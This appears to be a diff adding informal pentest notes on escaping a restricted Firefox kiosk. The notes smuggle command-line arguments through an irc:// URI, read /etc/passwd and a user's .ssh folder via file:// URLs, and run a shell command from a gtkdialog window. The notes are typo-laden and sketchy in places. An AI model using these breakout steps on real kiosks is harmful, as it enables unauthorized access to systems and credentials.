@@ -1,0 +1,36 @@
+# We cab breakout Firefox browser using -P
+
+irc://myhost -P "Haxor"
+
+# New intance of Firefox give more menus 
+
+# Lets try simple local file enum
+      file://etc/passwd
+      file://proc/version 
+      file://home/guest/.ssh
+
+# We can also try Firefox Develoepr like scratchpad
+
+    lets craete mytest.ext 
+    browse uri using firefox
+
+# We can create new gtk dialog box 
+<window>
+  <vbox>
+    <frame Description>
+      <text>
+        <label>This is an example window.</label>
+            </text>
+        </frame>
+        <hbox>
+            <button ok>
+            <action>echo "testing gtk" > /tmp/gtkoutput.txt</action>
+            </button>
+            <button cancel></button>
+        </hbox>
+    </vbox>
+</window>
+
+Save -> Mydialog 
+Now open irc://myhost -f /home/guest/mywindow with gtkwindow
+Nothing happens but we can see the output file:///tmp/gtkoutput.txt 
